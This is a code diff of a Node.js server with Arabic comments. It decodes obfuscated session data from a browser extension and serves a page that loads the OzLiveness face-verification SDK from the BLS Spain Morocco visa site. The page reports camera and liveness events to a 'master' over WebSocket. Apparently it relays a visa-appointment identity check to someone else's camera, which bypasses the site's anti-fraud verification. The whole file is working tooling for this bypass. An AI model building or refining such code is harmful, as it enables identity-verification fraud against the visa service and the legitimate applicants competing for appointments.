@@ -4,23 +4,17 @@ const http = require('http');
 const PORT = process.env.PORT || 8080;
 const masters = {}; 
 
-// دالة فك تشفير السيشن (لتوليد بيانات الكاميرا مباشرة)
+// دالة فك تشفير السيشن المطابقة لإضافتك
 function parse_silfi_session(sessionstring) {
   try {
-    return JSON.parse(
-      Buffer.from(
-        Buffer.from(Buffer.from(sessionstring).toString('utf8').replace(/b-/g, "=").split("").reverse().join(""), 'base64').toString('utf8'),
-        'base64'
-      ).toString('utf8')
-    );
+    let decoded = sessionstring.replace(/b-/g, "=").split("").reverse().join("");
+    let b1 = Buffer.from(decoded, 'base64').toString('utf8');
+    let b2 = Buffer.from(b1, 'base64').toString('utf8');
+    let mapped = b2.split("").reverse().map(e => String.fromCharCode(e.charCodeAt(0) + 9)).join("");
+    return JSON.parse(mapped);
   } catch (e) {
     try {
-      // محاولة فك التشفير بالخوارزمية القياسية للإضافة
-      let decoded = sessionstring.replace(/b-/g, "=").split("").reverse().join("");
-      let b1 = Buffer.from(decoded, 'base64').toString('utf8');
-      let b2 = Buffer.from(b1, 'base64').toString('utf8');
-      let mapped = b2.split("").reverse().map(e => String.fromCharCode(e.charCodeAt(0) + 9)).join("");
-      return JSON.parse(mapped);
+      return JSON.parse(Buffer.from(sessionstring, 'base64').toString('utf8'));
     } catch(err) {
       console.error("Parse Error:", err);
       return null;
@@ -35,7 +29,6 @@ const server = http.createServer((req, res) => {
 
     if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
-    // 🔥 صفحة العميل المباشرة التي تحمل الكاميرا وتفتحها تلقائياً
     if (req.method === 'GET' && req.url.startsWith('/liveness')) {
         const urlObj = new URL(req.url, 'https://silfi-production.up.railway.app');
         const sessionParam = urlObj.searchParams.get('session');
@@ -45,7 +38,11 @@ const server = http.createServer((req, res) => {
             sessionData = parse_silfi_session(sessionParam);
         }
 
-        const pluginUrl = sessionData ? sessionData.plugin_liveness_url : "https://www.blsspainmorocco.net/Scripts/OzLiveness.js";
+        // إذا لم يتم جلب الرابط، نضع رابط المكتبة القياسي الفعال
+        const sdkUrl = sessionData && sessionData.plugin_liveness_url 
+            ? sessionData.plugin_liveness_url 
+            : "https://www.blsspainmorocco.net/Content/assets/plugins/ozliveness/OzLiveness.js";
+
         const userId = sessionData ? sessionData.user_id : "";
         const transId = sessionData ? sessionData.transaction_id : "";
         const checkId = sessionData ? sessionData.check_id : "";
@@ -79,7 +76,7 @@ const server = http.createServer((req, res) => {
                     const userId = "${userId}";
                     const transId = "${transId}";
                     const checkId = "${checkId}";
-                    const sdkUrl = "${pluginUrl}";
+                    const sdkUrl = "${sdkUrl}";
 
                     function updateStatus(text) {
                         document.getElementById('status-text').innerText = text;
@@ -88,27 +85,23 @@ const server = http.createServer((req, res) => {
                     if (!sessionId) {
                         updateStatus("ERROR: INVALID SESSION");
                     } else {
-                        // 1. إعلام الماستر بأن العميل اتصل
                         fetch(SERVER_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ type: "CLIENT_CONNECTED", session_id: sessionId })
                         }).catch(e => {});
 
-                        // 2. حقن مكتبة الكاميرا الأصلية
                         const script = document.createElement('script');
                         script.src = sdkUrl;
                         script.onload = () => {
                             updateStatus("SYSTEM READY - OPENING CAMERA");
                             
-                            // إعلام الماستر أن الكاميرا بدأت
                             fetch(SERVER_URL, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({ type: "CLIENT_STARTED_LIVENESS", session_id: sessionId })
                             }).catch(e => {});
 
-                            // إخفاء اللودر وتفعيل الكاميرا
                             setTimeout(() => {
                                 document.getElementById('loader').style.display = 'none';
                                 
@@ -162,7 +155,6 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // استقبال البيانات من العميل وإرسالها للماستر عبر الـ WebSocket
     if (req.method === 'POST') {
         let body = '';
         req.on('data', chunk => { body += chunk.toString(); });
